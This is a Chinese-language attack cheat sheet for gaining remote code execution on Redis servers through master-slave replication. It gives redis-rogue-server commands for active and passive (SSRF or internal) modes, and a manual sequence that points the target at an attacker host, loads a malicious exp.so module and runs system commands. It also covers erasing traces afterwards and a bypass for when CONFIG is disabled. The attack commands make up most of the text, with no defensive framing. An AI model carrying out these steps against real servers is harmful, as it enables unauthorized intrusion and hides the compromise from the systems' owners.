## Redis主从复制

编译so文件 https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

将.so与 `redis-rogue-server.py`放置在同一目录下

### 主动连接模式

适用于目标Redis服务处于外网的情况

- 外网Redis未授权访问
- 已知外网Redis口令

启动redis server

```bash
python3 redis-rogue-server.py --server-only
```

主动连接发起攻击

```bash
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
```

### 被动连接模式

适用于目标Redis服务处于内网的情况

- 通过SSRF攻击Redis
- 内网Redis未授权访问/已知Redis口令, Redis需要反向连接redis rogue server

启动redis server

```bash
python3 redis-rogue-server.py --server-only
```

或者通过 `rogue-server.py`启动恶意服务

也可以使用脚本 `gopher_redis.py`

之后手工备份

```
1.config set dir ./
2.config set dbfilename exp.so
3.slaveof X.X.X.195
4.slaveof X.X.X.195 21000  #上面看绑定的服务段端口是21000
5. module load ./exp.so
6.slaveof no one
7.system.exec 'whoami'

清理痕迹
8.config set dbfilename dump.rdb
9.system.exec 'rm ./exp.so'
10.module unload system
```

## bypass

如果config命令被禁用了

```bash
rename-command CONFIG ""
```

同步之后 exp.so直接成了dump.rdb

直接module load dump.rdb就可以加载了

